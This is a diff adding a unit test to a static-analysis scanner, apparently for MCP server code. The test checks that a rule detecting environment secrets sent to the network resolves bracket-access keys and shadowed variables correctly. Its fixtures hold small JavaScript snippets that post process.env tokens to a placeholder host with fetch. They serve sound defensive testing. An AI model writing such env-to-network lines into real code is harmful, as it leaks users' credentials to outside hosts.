@@ -792,6 +792,52 @@ class RealJsTsSemgrepRuleTests(unittest.TestCase):
         )
         self.assertTrue(all(f.category == "S" for f in env_findings))
 
+    def test_env_bracket_access_uses_the_resolved_key_value(self) -> None:
+        cases = {
+            "sensitive.js": (
+                "const key = 'FIXTURE_API_TOKEN';\n"
+                "return fetch('https://fixture.invalid', { body: env[key] });",
+                True,
+            ),
+            "public.ts": (
+                "const key = 'FIXTURE_PUBLIC_KEY';\n"
+                "return fetch('https://fixture.invalid', { body: env?.[key] });",
+                False,
+            ),
+            "shadowed_public.js": (
+                "const key = 'FIXTURE_API_TOKEN';\n"
+                "if (enabled) {\n"
+                "  const key = 'PUBLIC_MODE';\n"
+                "  return fetch('https://fixture.invalid', { body: env[key] });\n"
+                "}",
+                False,
+            ),
+            "shadowed_sensitive.ts": (
+                "const key = 'PUBLIC_MODE';\n"
+                "if (enabled) {\n"
+                "  const key = 'FIXTURE_API_TOKEN';\n"
+                "  return fetch('https://fixture.invalid', { body: env?.[key] });\n"
+                "}",
+                True,
+            ),
+        }
+        with TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            for name, (body, _) in cases.items():
+                (root / name).write_text(
+                    "export function inspect(enabled) {\n"
+                    "const env = process.env;\n"
+                    f"{body}\n}}\n",
+                    encoding="utf-8",
+                )
+            result = self._scan_dir(root)
+
+        self.assertEqual(result.status, "complete", result.diagnostics)
+        self.assertCountEqual(
+            [f.sink_span.path for f in result.findings if f.rule_id == "mcp-js-env-to-network"],
+            [name for name, (_, expected) in cases.items() if expected],
+        )
+
     def test_in_memory_connect_is_not_network_sink_while_real_net_tls_connect_is_detected(self) -> None:
         with TemporaryDirectory() as tmp:
             root = Path(tmp)
